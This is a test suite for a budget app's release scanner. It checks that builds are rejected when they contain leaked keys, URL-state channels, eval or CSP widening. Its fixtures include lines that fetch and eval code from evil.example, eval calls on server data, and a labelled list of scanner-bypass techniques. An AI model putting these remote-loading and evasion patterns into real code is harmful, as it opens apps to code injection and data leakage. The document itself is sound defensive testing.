/// <reference types="node" />
import { spawnSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";

const appDirectory = fileURLToPath(new URL("../", import.meta.url));
const scannerPath = join(appDirectory, "scripts/release-scan.mjs");
const securityHeaders = JSON.parse(
  readFileSync(join(appDirectory, "security-headers.json"), "utf8"),
) as Record<string, string>;
const temporaryDirectories: string[] = [];

interface ScanFixture {
  readonly androidConfig: string;
  readonly dist: string;
}

function write(path: string, contents: string) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, contents, "utf8");
}

/**
 * The hash router as the production build minifies it (src/navigation/router.ts): the in-memory
 * history's two method definitions, the push and the replace call sites, the one traversal, and
 * its four reads of `location.hash`. Every fixture carries it, because a bundle without exactly
 * these is refused.
 */
const ROUTER_BUNDLE =
  "function DS(e=``){let t=[{state:null,hash:e}],n=new Set,r=0;return{location:{get hash(){return t[r]?.hash??``}}," +
  "history:{get state(){return t[r]?.state??null},pushState(e,n,i){t.splice(r+1,t.length,{state:e,hash:i??t[r]?.hash??``}),r+=1}," +
  "replaceState(e,n,i){t[r]={state:e,hash:i??t[r]?.hash??``}},go(e){let i=r+e;i<0||i>=t.length||i===r||(r=i)}}}}" +
  "function kS(e){let{window:t}=e,r=jv(Yv(t.location.hash).route),i=[MS],l=(e,n)=>{for(let r=n;r<e.length;r+=1)t.history.pushState(FS(e.slice(0,r+1)),``,e[r]??MS)}," +
  "u=e=>{t.history.replaceState(FS(e),``,e[e.length-1]??MS)},f=(e,n)=>{let o=n-1;t.history.go(o-(i.length-1))}," +
  "C=()=>{let o=Yv(t.location.hash)},w=()=>{a!==null||t.location.hash===Uv(r)||C()}," +
  "s=_S(t.location.hash);return{l,u,f,C,w,s}}";

/**
 * Everything else in the shipped bundle that the pinned counts see, as it minifies: React DOM's
 * iframe check, keyboard event field, transition tracking through the Navigation API and resource
 * hints; the PWA update flow's two reloads; the icon sprite, the skip link and the backup download;
 * the app's forms, each with its handler.
 */
const SHELL_BUNDLE =
  "try{var n=typeof t.contentWindow.location.href==`string`}catch{n=!1}" +
  "var Ie={key:0,code:0,location:0,ctrlKey:0};" +
  "c.addEventListener(`activated`,e=>{(e.isUpdate||e.isExternal)&&(n?n():window.location.reload())});" +
  "c.addEventListener(`controlling`,e=>{e.isUpdate&&(n?n():window.location.reload())});" +
  "if(!r&&!navigation.transition){var e=navigation.currentEntry;navigation.navigate(e.url,{state:e.getState(),info:`react-transition`,history:`replace`})}" +
  "navigation.addEventListener(`navigate`,e),navigation.addEventListener(`navigatesuccess`,t),navigation.addEventListener(`navigateerror`,t);" +
  "navigation.removeEventListener(`navigate`,e),navigation.removeEventListener(`navigatesuccess`,t),navigation.removeEventListener(`navigateerror`,t);" +
  "e={rel:e,crossOrigin:n,href:t};e=h({rel:`preload`,href:t});e=h({rel:`modulepreload`,href:e},t);" +
  "e=h({rel:`stylesheet`,href:e});n={rel:`preload`,as:`style`,href:n.href};o={href:null,precedence:null};" +
  "i.crossOrigin=``,i.href=t;r=t.document.createElement(`a`);r.href=n,r.download=e.filename;" +
  "(0,L.jsx)(`use`,{href:`#${cr}${e}`});(0,L.jsx)(`a`,{className:`skip-link`,href:`#${KS}`,onClick:e});" +
  "(0,L.jsxs)(`form`,{className:`record-form`,onSubmit:Ie,noValidate:!0,children:[]});(0,L.jsxs)(`form`,{onSubmit:f,noValidate:!0,children:[]});";

function createScanFixture(): ScanFixture {
  const root = mkdtempSync(join(tmpdir(), "family-budget-release-scan-test-"));
  temporaryDirectories.push(root);
  const dist = join(root, "dist");
  const androidConfig = join(root, "capacitor.config.ts");

  write(
    join(dist, "index.html"),
    '<!doctype html><script type="module" src="/assets/index-safe.js"></script>',
  );
  write(
    join(dist, "assets/index-safe.js"),
    `const diagnostic = "https://react.dev/errors/418"; ${ROUTER_BUNDLE} ${SHELL_BUNDLE} export { diagnostic };`,
  );
  write(
    join(dist, "sw.js"),
    'precacheAndRoute([{url:"build-meta.json",revision:"test"}]); NavigationRoute;',
  );
  write(join(dist, "build-meta.json"), '{"buildId":"scan-test"}\n');
  write(
    join(dist, "manifest.webmanifest"),
    JSON.stringify({
      display: "standalone",
      icons: [
        {
          purpose: "any",
          sizes: "192x192",
          src: "/icon-192.png",
        },
        {
          purpose: "any maskable",
          sizes: "512x512",
          src: "/icon-512.png",
        },
      ],
      id: "/",
      scope: "/",
      start_url: "/",
    }),
  );
  write(
    join(dist, "_headers"),
    `/*\n${Object.entries(securityHeaders)
      .map(([name, value]) => `  ${name}: ${value}`)
      .join("\n")}\n`,
  );
  write(androidConfig, 'export default { webDir: "../web-pwa/dist" };\n');

  return { androidConfig, dist };
}

function runScan(fixture: ScanFixture) {
  return spawnSync(
    process.execPath,
    [
      scannerPath,
      "--dist",
      fixture.dist,
      "--android-config",
      fixture.androidConfig,
    ],
    {
      encoding: "utf8",
      env: { ...process.env },
      timeout: 10_000,
    },
  );
}

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) {
    rmSync(directory, { force: true, recursive: true });
  }
});

describe("production release scanner", () => {
  it("accepts a clean split-free artifact containing a React diagnostic URL", () => {
    const result = runScan(createScanFixture());

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it("rejects browser storage in a code-split application chunk", () => {
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/budget-store-abc123.js"),
      'localStorage.setItem("budget", "private");',
    );

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "browser key/value storage access found in assets/budget-store-abc123.js",
    );
  });

  it.each([
    ["AWS access key", 'const leaked = "AKIAIOSFODNN7EXAMPLE";'],
    [
      "private key",
      'const leaked = "-----BEGIN PRIVATE KEY-----\\\\nprivate\\\\n-----END PRIVATE KEY-----";',
    ],
    ["absolute local filesystem path", 'const leaked = "/Users/alice/private/budget.json";'],
  ])("rejects %s in any text artifact", (label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "metadata.json"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(`${label} found in metadata.json`);
  });

  it.each([
    ["location.search", 'const filter = new URL(location.search, "http://x").search;'],
    ["location.hash written around the router", 'location.hash = "#/spent/" + amount;'],
    ["location.hash appended to", 'location.hash+="/1200";'],
    ["location.assign", 'location.assign("#/spent?amount=1200");'],
    ["location.replace", 'location.replace("/budget/" + month);'],
    ["location.href written", 'location.href="/spent?amount=1200";'],
    ["location replaced whole", 'window.location="/spent";'],
    ["location by bracket", 'location["hash"]="#/x";'],
    ["history traversal", "history.back();"],
    ["a second history traversal", "t.history.go(-1);"],
    ["history.pushState with a path", 'history.pushState(null, "", "/budget/january");'],
    ["history.replaceState with state", 'history.replaceState({ amount: 1200 }, "", "/spent");'],
    ["history.pushState through another object", 'frame.history.pushState(state, "", `/budget/${month}`);'],
    ["state that is not the router's", 'history.pushState({amount:1200,note:n},"","#/");'],
    ["a fragment with an interpolated amount", 'history.pushState(null,"",`#/spent?amount=${a}`);'],
    ["a fragment with a concatenated amount", 'history.pushState(null,"","#/spent?amount="+a);'],
    ["an address built before the call", 'const u="/budget/"+m;history.pushState(null,"",u);'],
    ["bracket access", 'history["pushState"](null,"","#/");'],
    ["a call through .call", 'history.pushState.call(history,null,"","#/");'],
    ["a destructured method", "const{replaceState:x}=window.history;x(null,``,a);"],
  ])("rejects the address bar as a state channel: %s", (_label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/router-abc123.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("URL state channel");
  });

  it.each([
    ["state written as a literal", "t.history.pushState(FS(e.slice(0,r+1)),``,e[r]??MS)", "t.history.pushState({mark:`nash-budget/route`,stack:e,amount:a},``,e[r]??MS)"],
    ["an address concatenated", "t.history.pushState(FS(e.slice(0,r+1)),``,e[r]??MS)", 't.history.pushState(FS(e.slice(0,r+1)),``,"#/new?edit="+e[r])'],
    ["an address interpolated", "t.history.pushState(FS(e.slice(0,r+1)),``,e[r]??MS)", "t.history.pushState(FS(e.slice(0,r+1)),``,`#/new?note=${e[r]}`)"],
    ["an address that is a literal", "t.history.replaceState(FS(e),``,e[e.length-1]??MS)", 't.history.replaceState(FS(e),``,"#/spent")'],
    ["a title that is not empty", "t.history.replaceState(FS(e),``,e[e.length-1]??MS)", 't.history.replaceState(FS(e),"кофе",e[e.length-1]??MS)'],
    ["a call site fewer", "t.history.replaceState(FS(e),``,e[e.length-1]??MS)", "void 0"],
    ["a call site more", "t.history.replaceState(FS(e),``,e[e.length-1]??MS)", "t.history.replaceState(FS(e),``,e[e.length-1]??MS),t.history.pushState(FS(e),``,e[0]??MS)"],
  ])("rejects a router whose history calls changed: %s", (_label, original, changed) => {
    const fixture = createScanFixture();
    expect(ROUTER_BUNDLE).toContain(original);
    write(
      join(fixture.dist, "assets/index-safe.js"),
      `const diagnostic = "https://react.dev/errors/418"; ${ROUTER_BUNDLE.replace(original, changed)} ${SHELL_BUNDLE} export { diagnostic };`,
    );

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("URL state channel");
  });

  // The bypasses of the re-review of 2a (round 2), exactly as the production build minified them
  // when they were put into the operation form (`console.info` markers dropped). Each is refused.
  // A10 — a name assembled from strings at run time — is deliberate obfuscation, outside the model
  // (docs/SECURITY.md §7.3), and is not listed.
  it.each([
    ["A01 the amount in the document title", "document.title=`${d.amount} ₽ — Наш бюджет`"],
    ["A02 a link built in a variable, then clicked", "{let e=`#/operations?q=${encodeURIComponent(d.amount)}`,t=document.createElement(`a`);t.href=e,t.click()}"],
    ["A03 window.open into this window", "window.open(`#/operations?q=${encodeURIComponent(d.amount)}`,`_self`)"],
    ["A04 the Navigation API", "navigation.navigate(`#/operations?q=${encodeURIComponent(d.amount)}`,{history:`replace`,state:{amount:d.amount}})"],
    ["A05 location under another name", "{let e=location;e.hash=`#/operations?q=${d.amount}`}"],
    ["A06 Object.assign over location", "Object.assign(location,{hash:`#/operations?q=${d.amount}`})"],
    ["A07 history destructured under another name", "{let{history:e}=window;e.go(-1)}"],
    ["A08 Reflect.apply of pushState", "Reflect.apply(History.prototype.pushState,history,[null,``,`#/operations?q=${d.amount}`])"],
    ["A09 history through a global", "globalThis.history.replaceState(history.state,``,`#/operations?q=${d.amount}`)"],
    ["A11 history destructured, method name joined", "{let{history:e}=window;e[[`push`,`State`].join(``)](null,``,`#/operations?q=${d.amount}`)}"],
    ["A12 a URL object and location.replace", "{let e=new URL(document.baseURI);e.hash=`/operations?q=${d.amount}`,window.location.replace(e)}"],
    ["A13 optional chaining", "globalThis?.history?.pushState?.(null,``,`#/operations?q=${d.amount}`)"],
    ["A14 document.location", "document.location.hash=`#/operations?q=${d.amount}`"],
    ["A15 location passed to a helper", "((e,t)=>{e.hash=t})(location,`#/operations?q=${d.amount}`)"],
    ["A16 a JSX link into the fragment", "(0,L.jsx)(`a`,{hidden:!0,href:`#/operations?q=${encodeURIComponent(d.amount)}`,children:`Поиск`})"],
    ["A16 the same link with its href in a variable", "let Ne=d.amount;(0,L.jsx)(`a`,{hidden:!0,href:Ne,children:`Поиск`})"],
    ["A17 a form that submits by GET", "(0,L.jsxs)(`form`,{role:`search`,children:[(0,L.jsx)(`input`,{id:`report-search`,name:`q`,type:`search`})]})"],
    ["a bare open()", "open(`#/spent`,`_self`)"],
    ["a global aliased whole", "{let w=window;w.history.go(-1)}"],
  ])("rejects the re-review's bypass as the build minifies it: %s", (_label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/router-abc123.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("URL state channel");
  });

  it("accepts the hash router in its own chunk: the pins hold across bundles together", () => {
    // План волны 2, §2.1: маршрут живёт в решётке адреса, и пишет её один модуль — роутер, ключами
    // `formatRoute` (закрытая грамматика, без свободного текста). Так выглядит его собранный код.
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/index-safe.js"),
      `const diagnostic = "https://react.dev/errors/418"; ${SHELL_BUNDLE} export { diagnostic };`,
    );
    write(join(fixture.dist, "assets/router-abc123.js"), ROUTER_BUNDLE);

    const result = runScan(fixture);

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it("the pinned call sites are the ones the router source has", () => {
    const router = readFileSync(join(appDirectory, "src/navigation/router.ts"), "utf8");
    const scanner = readFileSync(scannerPath, "utf8");
    const calls = (method: string) => [...router.matchAll(new RegExp(`\\.${method}\\(`, "gu"))].length;
    expect(scanner).toContain(`const HISTORY_CALL_SITES = { pushState: ${calls("pushState")}, replaceState: ${calls("replaceState")} };`);
    expect(scanner).toContain(`const HISTORY_TRAVERSALS = ${[...router.matchAll(/history\.go\(/gu)].length};`);
  });

  it("accepts a query string built for an outgoing sync request", () => {
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/sync-transport-abc123.js"),
      'const query = new URLSearchParams({ after: cursor, keyEpoch: "3", limit: "200" });' +
        ' fetch(`${serverOrigin}/journal?${query.toString()}`);',
    );

    const result = runScan(fixture);

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it.each([
    'fetch("https://evil.example/payload.js").then((response) => response.text()).then(eval);',
    'import("https://evil.example/payload.js");',
  ])("rejects remote executable acquisition: %s", (contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/lazy-feature.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "remote executable loading found in assets/lazy-feature.js",
    );
  });
});

/**
 * Запрет строкового исполнения — то, что политике позволено ослабить, и то, что нет.
 *
 * `script-src` теперь несёт `'wasm-unsafe-eval'`: без него Argon2id приглашений (`hash-wasm`,
 * WebAssembly) не компилируется в браузере. Это ключевое слово разрешает только модули
 * WebAssembly, а `eval`, `new Function` и строковые таймеры остаются запрещёнными — и запрещены
 * они не одним лишь заголовком, а сканом готовой сборки, который смотрит на сам код. Тесты ниже
 * держат оба запрета на месте: и в бандлах, и в самой политике.
 */
describe("release scanner keeps dynamic string execution out", () => {
  it.each([
    ["eval", "eval(receivedFromServer);"],
    ["new Function", 'const run = new Function("payload", receivedFromServer);'],
    ["setTimeout with a string body", 'setTimeout("drainBudget()", 0);'],
    ["setInterval with a string body", "setInterval('drainBudget()', 1000);"],
  ])("rejects %s in an application chunk", (_label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/dynamic-abc123.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "dynamic string execution found in assets/dynamic-abc123.js",
    );
  });

  it("accepts the shipped policy, which allows WebAssembly and nothing else", () => {
    expect(securityHeaders["Content-Security-Policy"]).toContain(
      "script-src 'self' 'wasm-unsafe-eval'",
    );

    const result = runScan(createScanFixture());

    expect(result.status, result.stderr).toBe(0);
  });

  it("rejects a deployed policy that widens the WebAssembly allowance into 'unsafe-eval'", () => {
    const fixture = createScanFixture();
    const widened = Object.entries(securityHeaders).map(([name, value]) =>
      name === "Content-Security-Policy"
        ? `  ${name}: ${value.replace(
            "script-src 'self' 'wasm-unsafe-eval'",
            "script-src 'self' 'wasm-unsafe-eval' 'unsafe-eval'",
          )}`
        : `  ${name}: ${value}`,
    );
    write(join(fixture.dist, "_headers"), `/*\n${widened.join("\n")}\n`);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("alters the \"script-src 'self' 'wasm-unsafe-eval'\" directive");
  });
});
